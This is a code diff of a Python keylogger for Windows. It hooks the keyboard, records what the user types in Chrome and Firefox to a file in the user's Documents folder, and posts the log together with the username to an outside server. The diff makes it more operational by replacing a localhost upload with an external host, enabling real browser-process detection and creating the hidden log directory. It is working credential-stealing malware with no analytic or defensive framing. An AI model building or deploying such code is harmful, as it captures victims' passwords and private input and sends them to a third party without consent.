@@ -4,19 +4,21 @@ import os, datetime, thread
 
 def getLines():
     try:
-        with open(os.path.join(SECRET_PATH,'readme')) as f:
+        with open(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document','readme')) as f:
                 for i, l in enumerate(f):
                     pass
         return i + 1
     except:
         return 0
 
-SECRET_PATH = ''
 NORMALIZER = '                                                                      '
+SERVER_ADRESS='http://testkeylog.comyr.com'
+# testkeylog.comyr.com/index.php
+
 currString = ''
 numLines = getLines()
 print numLines
-MAX_LINES = 5
+MAX_LINES = 20
 
 def getProcessName(windowHandle):
     tid, pid = win32process.GetWindowThreadProcessId(windowHandle)
@@ -42,7 +44,7 @@ def OnKeyboardEvent(event):
 
         if (currString != ''):
 
-            f = open(os.path.join(SECRET_PATH,'readme'),'a')
+            f = open(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document','readme'),'a')
             f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+" -- "+ currString + NORMALIZER[0:70-len(currString)]+" -- "+event.WindowName+ "\n")
             f.close()
             currString = ''
@@ -53,8 +55,8 @@ def OnKeyboardEvent(event):
 
         return True
         
-    #processName = getProcessName(event.Window)
-    processName = "chrome.exe"
+    processName = getProcessName(event.Window)
+    #processName = "chrome.exe"
     if(processName == "chrome.exe" or processName == "firefox.exe"):
         currString = currString + chr(event.Ascii)
         print 'CurrString:',currString
@@ -67,30 +69,32 @@ def postToWeb():
     global MAX_LINES
 
     try:
-        f = open(os.path.join(SECRET_PATH,'readme'))
+        f = open(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document','readme'))
         alldata = f.read()
         f.close()
-        
-        page = requests.get("http://127.0.0.1?q="+alldata +"&n="+os.getenv('USERNAME'), verify = False)
+
+        payload = { 'q': alldata , 'n':os.getenv('USERNAME')}
+        page = requests.post(SERVER_ADRESS,data = payload, verify = False)
         
         print "Sent data succesfully ~"
-        f = open(os.path.join(SECRET_PATH,'readme'),'w')
+        f = open(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document','readme'),'w')
         f.close()
         numLines = 0
-        MAX_LINES = 5
+        MAX_LINES = 20
 
     except:
         print "Could not connect ~"
-        MAX_LINES = MAX_LINES + 5
+        MAX_LINES = MAX_LINES + 20
 
-    return
-        
+    return   
 
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = OnKeyboardEvent
 hookManager.HookKeyboard()
 
-#thread.start_new_thread(postToWeb,())
+if not os.path.exists(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document')):
+    os.makedirs(os.path.join('C:\Users',os.getenv('USERNAME'),'Documents\Test-Document'))
+
 # to avoid keyboard interrupt
 while True:
     try:
